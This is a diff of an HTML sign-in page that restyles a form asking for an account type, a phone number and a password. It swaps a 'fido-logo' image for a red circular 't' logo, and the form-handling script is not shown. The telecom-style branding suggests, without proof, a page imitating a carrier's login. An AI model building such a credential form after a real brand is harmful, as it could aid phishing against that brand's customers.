@@ -9,40 +9,51 @@
     body {
       margin: 0;
       font-family: Arial, Helvetica, sans-serif;
-      background: #0e0e0e;
+      background: radial-gradient(circle at top right, #b71c1c 0%, #0b0b0b 45%);
       color: #ffffff;
       min-height: 100vh;
       display: flex;
-      flex-direction: column;
+      align-items: center;
       justify-content: center;
     }
 
     .container {
+      width: 100%;
       max-width: 420px;
-      margin: auto;
       padding: 24px;
     }
 
-    .logo {
+    /* LOGO */
+    .logo-wrap {
       text-align: center;
-      margin-bottom: 20px;
+      margin-bottom: 28px;
     }
 
-    .logo img {
-      width: 56px;
-      margin-bottom: 8px;
+    .logo-circle {
+      width: 64px;
+      height: 64px;
+      background: #e53935;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 10px;
+      font-size: 36px;
+      font-weight: bold;
+      color: #ffffff;
+      font-family: Arial, Helvetica, sans-serif;
     }
 
-    .logo h1 {
-      font-size: 22px;
+    .logo-wrap h1 {
       margin: 0;
+      font-size: 22px;
       color: #e53935;
     }
 
-    .logo p {
+    .logo-wrap p {
+      margin-top: 6px;
       font-size: 14px;
       color: #bdbdbd;
-      margin-top: 6px;
     }
 
     label {
@@ -65,10 +76,6 @@
       outline: none;
     }
 
-    input::placeholder {
-      color: #777;
-    }
-
     select {
       appearance: none;
       background-image: url("data:image/svg+xml,%3Csvg width='12' height='8' viewBox='0 0 12 8' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1L6 6L11 1' stroke='%23aaa' stroke-width='2'/%3E%3C/svg%3E");
@@ -83,13 +90,13 @@
       font-size: 16px;
       border-radius: 10px;
       cursor: pointer;
-      border: none;
     }
 
     .primary-btn {
       background: #e53935;
       color: #ffffff;
-      margin-top: 10px;
+      border: none;
+      margin-top: 6px;
     }
 
     .secondary-btn {
@@ -123,28 +130,28 @@
 
   <div class="container">
 
-    <!-- HEADER / LOGO -->
-    <div class="logo">
-      <img src="fido-logo.jpeg" alt="Logo">
+    <!-- LOGO + TITLE -->
+    <div class="logo-wrap">
+      <div class="logo-circle">t</div>
       <h1>Welcome</h1>
-      <p>Enter your details to continue</p>
+      <p>Enter your number to sign up or log in.</p>
     </div>
 
     <!-- FORM -->
     <form id="detailsForm">
 
-      <!-- NEW FIELD (UI ONLY) -->
+      <!-- ACCOUNT TYPE (UI ONLY) -->
       <label>Account type</label>
       <select>
-        <option value="mobile">Mobile</option>
-        <option value="broadband">Broadband</option>
+        <option>Mobile</option>
+        <option>Broadband</option>
       </select>
 
-      <label>Phone number</label>
-      <input type="text" id="phone" placeholder="Enter phone number" required />
+      <label>Phone Number</label>
+      <input type="text" id="phone" required />
 
       <label>Password</label>
-      <input type="password" id="password" placeholder="Enter password" required />
+      <input type="password" id="password" required />
 
       <button type="submit" class="primary-btn">Next</button>
     </form>
@@ -156,6 +163,7 @@
     <div class="footer">v 5.3.2 (1.0.0)</div>
   </div>
 
+  <!-- LOGIC UNCHANGED -->
   <script>
     const form = document.getElementById('detailsForm');
     const statusEl = document.getElementById('status');
